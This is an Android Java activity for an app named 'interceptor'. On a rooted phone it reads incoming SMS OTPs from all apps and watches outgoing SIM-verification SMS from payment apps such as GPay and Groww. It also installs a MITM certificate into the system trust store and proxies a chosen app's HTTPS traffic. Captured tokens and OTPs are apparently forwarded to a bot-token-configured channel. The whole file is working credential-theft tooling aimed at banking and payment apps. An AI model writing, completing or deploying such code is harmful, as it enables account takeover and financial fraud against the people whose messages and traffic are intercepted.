package com.tok.interceptor;

import android.Manifest;
import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.view.*;
import android.widget.*;

public class MainActivity extends Activity {

    private static final int REQ_PICK_APP    = 1;
    private static final int REQ_SMS_PERMS   = 2;

    private EditText etBotToken, etChannelId, etTargetApp;
    private TextView tvStatus, tvLog;
    private Button btnPickApp, btnStartStop, btnInstallCert;
    private ScrollView scrollView;

    private ProxyManager    proxyManager;
    private IptablesManager iptablesManager;
    private SentSmsObserver sentSmsObserver;
    private SharedPreferences prefs;

    private String selectedPackage = "";
    private int    selectedUid     = -1;
    private boolean running        = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs         = getSharedPreferences("config", MODE_PRIVATE);
        proxyManager  = new ProxyManager(this);

        etBotToken    = findViewById(R.id.et_bot_token);
        etChannelId   = findViewById(R.id.et_channel_id);
        etTargetApp   = findViewById(R.id.et_target_app);
        tvStatus      = findViewById(R.id.tv_status);
        tvLog         = findViewById(R.id.tv_log);
        btnPickApp    = findViewById(R.id.btn_pick_app);
        btnStartStop  = findViewById(R.id.btn_start_stop);
        btnInstallCert= findViewById(R.id.btn_install_cert);
        scrollView    = findViewById(R.id.scroll_log);

        // restore saved config
        etBotToken.setText(prefs.getString("bot_token", ""));
        etChannelId.setText(prefs.getString("channel_id", ""));
        selectedPackage = prefs.getString("target_package", "");
        selectedUid     = prefs.getInt("target_uid", -1);
        etTargetApp.setText(selectedPackage);

        // hook incoming SMS listener
        SmsBroadcastReceiver.setListener((sender, body) ->
            runOnUiThread(() -> log("📱 Incoming SMS from " + sender + ": " + body))
        );

        // hook outgoing (silent SIM-verify) SMS listener
        SentSmsObserver.setListener((toNumber, body) ->
            runOnUiThread(() -> log("📤 Outgoing SMS to " + toNumber + ": " + body))
        );

        btnPickApp.setOnClickListener(v ->
            startActivityForResult(
                new Intent(this, AppPickerActivity.class), REQ_PICK_APP));

        btnInstallCert.setOnClickListener(v -> installCert());
        btnStartStop.setOnClickListener(v -> {
            if (running) stopInterception();
            else         startInterception();
        });

        // check root
        new Thread(() -> {
            boolean hasRoot = RootShell.checkRoot();
            runOnUiThread(() -> {
                if (!hasRoot) {
                    tvStatus.setText("⛔ No root access");
                    btnStartStop.setEnabled(false);
                } else {
                    tvStatus.setText("✅ Root OK — Ready");
                }
            });
        }).start();

        // request SMS permissions at runtime (Android 6+)
        requestSmsPermissions();
    }

    private void requestSmsPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
             || checkSelfPermission(Manifest.permission.READ_SMS)    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
                }, REQ_SMS_PERMS);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] grants) {
        if (req == REQ_SMS_PERMS) {
            boolean ok = true;
            for (int g : grants) if (g != PackageManager.PERMISSION_GRANTED) { ok = false; break; }
            if (ok) log("✅ SMS permissions granted — will intercept OTP SMS from all apps");
            else    log("⚠ SMS permissions denied — SMS interception disabled");
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        if (req == REQ_PICK_APP && res == RESULT_OK && data != null) {
            selectedPackage = data.getStringExtra(AppPickerActivity.EXTRA_PACKAGE);
            selectedUid     = data.getIntExtra(AppPickerActivity.EXTRA_UID, -1);
            etTargetApp.setText(selectedPackage);
            prefs.edit()
                .putString("target_package", selectedPackage)
                .putInt("target_uid", selectedUid)
                .apply();
            log("Target set: " + selectedPackage + " (uid=" + selectedUid + ")");
        }
    }

    private void startInterception() {
        String botToken   = etBotToken.getText().toString().trim();
        String channelId  = etChannelId.getText().toString().trim();

        if (botToken.isEmpty() || channelId.isEmpty()) {
            toast("Fill in Bot Token and Channel ID"); return;
        }

        prefs.edit()
            .putString("bot_token",  botToken)
            .putString("channel_id", channelId)
            .putString("target_app", selectedPackage)
            .apply();

        tvStatus.setText("⏳ Starting...");
        btnStartStop.setEnabled(false);

        // SMS interception works globally — no target app needed
        // HTTPS proxy still needs a target UID
        boolean hasTarget = selectedUid != -1;
        if (hasTarget) {
            iptablesManager = new IptablesManager(selectedUid);
        }

        new Thread(() -> {
            StringBuilder startLog = new StringBuilder();
            try {
                // Start outgoing SMS observer (catches silent SIM-verify SMS from GPay/Groww etc.)
                sentSmsObserver = new SentSmsObserver(MainActivity.this);
                sentSmsObserver.register();
                startLog.append("Outgoing SMS observer active (GPay/Groww SIM verify)\n");

                // SMS interception is always active once permissions are granted
                startLog.append("Incoming SMS interception active for all apps\n");

                // Start HTTPS proxy if a target app was chosen
                if (hasTarget) {
                    proxyManager.start();
                    Thread.sleep(500);
                    iptablesManager.start();
                    startLog.append("HTTPS proxy active for ").append(selectedPackage);
                } else {
                    startLog.append("(No target app — HTTPS proxy skipped)");
                }

                running = true;
                final String logMsg = startLog.toString();
                runOnUiThread(() -> {
                    tvStatus.setText("🟢 Intercepting — SMS + " + (hasTarget ? selectedPackage : "no HTTPS"));
                    btnStartStop.setText("Stop");
                    btnStartStop.setEnabled(true);
                    log(logMsg);
                    log("Tokens/OTPs will appear in " + channelId);
                });
            } catch (Exception e) {
                runOnUiThread(() -> {
                    tvStatus.setText("❌ Error: " + e.getMessage());
                    btnStartStop.setEnabled(true);
                    log("ERROR: " + e.getMessage());
                });
            }
        }).start();
    }

    private void stopInterception() {
        tvStatus.setText("⏳ Stopping...");
        btnStartStop.setEnabled(false);

        new Thread(() -> {
            try {
                if (sentSmsObserver != null) sentSmsObserver.unregister();
                if (iptablesManager != null) iptablesManager.stop();
                proxyManager.stop();
                running = false;
                runOnUiThread(() -> {
                    tvStatus.setText("⚫ Stopped");
                    btnStartStop.setText("Start");
                    btnStartStop.setEnabled(true);
                    log("Stopped.");
                });
            } catch (Exception e) {
                runOnUiThread(() -> {
                    tvStatus.setText("⚠ Stop error: " + e.getMessage());
                    btnStartStop.setEnabled(true);
                    log("Stop ERROR: " + e.getMessage());
                });
            }
        }).start();
    }

    private void installCert() {
        tvStatus.setText("⏳ Installing cert...");
        new Thread(() -> {
            try {
                CertInstaller.installCert(MainActivity.this);
                runOnUiThread(() -> {
                    tvStatus.setText("✅ Cert installed — Reboot recommended");
                    log("MITM cert installed to system trust store.");
                });
            } catch (Exception e) {
                runOnUiThread(() -> {
                    tvStatus.setText("❌ Cert error: " + e.getMessage());
                    log("Cert ERROR: " + e.getMessage());
                });
            }
        }).start();
    }

    private void log(String msg) {
        String current = tvLog.getText().toString();
        tvLog.setText(current + "\n> " + msg);
        scrollView.post(() -> scrollView.fullScroll(View.FOCUS_DOWN));
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }
}
